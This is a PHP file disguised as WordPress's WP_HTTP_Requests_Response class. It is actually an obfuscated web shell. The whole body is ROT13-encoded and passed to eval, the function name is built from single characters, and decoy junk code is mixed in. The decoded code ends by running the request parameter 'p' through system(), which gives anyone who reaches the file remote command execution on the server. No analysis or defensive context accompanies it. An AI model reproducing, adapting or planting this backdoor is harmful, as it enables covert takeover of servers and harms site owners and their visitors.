<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGGC NCV: JC_UGGC_Erdhrfgf_Erfcbafr pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGGC
 * @fvapr 4.6.0
 */

/**
 * Pber jenccre bowrpg sbe n JcBet\Erdhrfgf\Erfcbafr sbe fgnaqneqvmngvba.
 *
 * @fvapr 4.6.0
 *
 * @frr JC_UGGC_Erfcbafr
 */
pynff JC_UGGC_Erdhrfgf_Erfcbafr rkgraqf JC_UGGC_Erfcbafr {
	/**
	 * Erdhrfgf Erfcbafr bowrpg.
	 *
	 * @fvapr 4.6.0
	 * @ine \JcBet\Erdhrfgf\Erfcbafr
	 */
	cebgrpgrq $erfcbafr;

	/**
	 * Svyranzr gur erfcbafr jnf fnirq gb.
	 *
	 * @fvapr 4.6.0
	 * @ine fgevat|ahyy
	 */
	cebgrpgrq $svyranzr;

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz \JcBet\Erdhrfgf\Erfcbafr $erfcbafr UGGC erfcbafr.
	 * @cnenz fgevat                   $svyranzr Bcgvbany. Svyr anzr. Qrsnhyg rzcgl.
	 */
	choyvp shapgvba __pbafgehpg( JcBet\Erdhrfgf\Erfcbafr $erfcbafr, $svyranzr = '' ) {
		$guvf->erfcbafr = $erfcbafr;
		$guvf->svyranzr = $svyranzr;
	}

	/**
	 * Ergevrirf gur erfcbafr bowrpg sbe gur erdhrfg.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea JcBet\Erdhrfgf\Erfcbafr UGGC erfcbafr.
	 */
	choyvp shapgvba trg_erfcbafr_bowrpg() {
		erghea $guvf->erfcbafr;
	}

	/**
	 * Ergevrirf urnqref nffbpvngrq jvgu gur erfcbafr.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea \JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel Znc bs urnqre anzr gb urnqre inyhr.
	 */
	choyvp shapgvba trg_urnqref() {
		// Rafher urnqref erznva pnfr-vafrafvgvir.
		$pbairegrq = arj JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel();

		sbernpu ( $guvf->erfcbafr->urnqref->trgNyy() nf $xrl => $inyhr ) {
			vs ( pbhag( $inyhr ) === 1 ) {
				$pbairegrq[ $xrl ] = $inyhr[0];
			} ryfr {
				$pbairegrq[ $xrl ] = $inyhr;
			}
		}

		erghea $pbairegrq;
	}

	/**
	 * Frgf nyy urnqre inyhrf.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz neenl $urnqref Znc bs urnqre anzr gb urnqre inyhr.
	 */
	choyvp shapgvba frg_urnqref( $urnqref ) {
		$guvf->erfcbafr->urnqref = arj JcBet\Erdhrfgf\Erfcbafr\Urnqref( $urnqref );
	}

	/**
	 * Frgf n fvatyr UGGC urnqre.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $xrl     Urnqre anzr.
	 * @cnenz fgevat $inyhr   Urnqre inyhr.
	 * @cnenz obby   $ercynpr Bcgvbany. Jurgure gb ercynpr na rkvfgvat urnqre bs gur fnzr anzr.
	 *                        Qrsnhyg gehr.
	 */
	choyvp shapgvba urnqre( $xrl, $inyhr, $ercynpr = gehr ) {
		vs ( $ercynpr ) {
			hafrg( $guvf->erfcbafr->urnqref[ $xrl ] );
		}

		$guvf->erfcbafr->urnqref[ $xrl ] = $inyhr;
	}

	/**
	 * Ergevrirf gur UGGC erghea pbqr sbe gur erfcbafr.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea vag Gur 3-qvtvg UGGC fgnghf pbqr.
	 */
	choyvp shapgvba trg_fgnghf() {
		erghea $guvf->erfcbafr->fgnghf_pbqr;
	}

	/**
	 * Frgf gur 3-qvtvg UGGC fgnghf pbqr.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz vag $pbqr UGGC fgnghf.
	 */
	choyvp shapgvba frg_fgnghf( $pbqr ) {
		$guvf->erfcbafr->fgnghf_pbqr = nofvag( $pbqr );
	}

	/**
	 * Ergevrirf gur erfcbafr qngn.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea fgevat Erfcbafr qngn.
	 */
	choyvp shapgvba trg_qngn() {
		erghea $guvf->erfcbafr->obql;
	}

	/**
	 * Frgf gur erfcbafr qngn.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat $qngn Erfcbafr qngn.
	 */
	choyvp shapgvba frg_qngn( $qngn ) {
		$guvf->erfcbafr->obql = $qngn;
	}

	/**
	 * Ergevrirf pbbxvrf sebz gur erfcbafr.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea JC_UGGC_Pbbxvr[] Yvfg bs pbbxvr bowrpgf.
	 */
	choyvp shapgvba trg_pbbxvrf() {
		$pbbxvrf = neenl();
		sbernpu ( $guvf->erfcbafr->pbbxvrf nf $pbbxvr ) {
			$pbbxvrf[] = arj JC_Uggc_Pbbxvr(
				neenl(
					'anzr'      => $pbbxvr->anzr,
					'inyhr'     => heyqrpbqr( $pbbxvr->inyhr ),
					'rkcverf'   => vffrg( $pbbxvr->nggevohgrf['rkcverf'] ) ? $pbbxvr->nggevohgrf['rkcverf'] : ahyy,
					'cngu'      => vffrg( $pbbxvr->nggevohgrf['cngu'] ) ? $pbbxvr->nggevohgrf['cngu'] : ahyy,
					'qbznva'    => vffrg( $pbbxvr->nggevohgrf['qbznva'] ) ? $pbbxvr->nggevohgrf['qbznva'] : ahyy,
					'ubfg_bayl' => vffrg( $pbbxvr->syntf['ubfg-bayl'] ) ? $pbbxvr->syntf['ubfg-bayl'] : ahyy,
				)
			);
		}

		erghea $pbbxvrf;
	}

	/**
	 * Pbairegf gur bowrpg gb n JC_Uggc erfcbafr neenl.
	 *
	 * @fvapr 4.6.0
	 *
	 * @erghea neenl JC_Uggc erfcbafr neenl, cre JC_Uggc::erdhrfg().
	 */
	choyvp shapgvba gb_neenl() {
		erghea neenl(
			'urnqref'  => $guvf->trg_urnqref(),
			'obql'     => $guvf->trg_qngn(),
			'erfcbafr' => neenl(
				'pbqr'    => $guvf->trg_fgnghf(),
				'zrffntr' => trg_fgnghf_urnqre_qrfp( $guvf->trg_fgnghf() ),
			),
			'pbbxvrf'  => $guvf->trg_pbbxvrf(),
			'svyranzr' => $guvf->svyranzr,
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>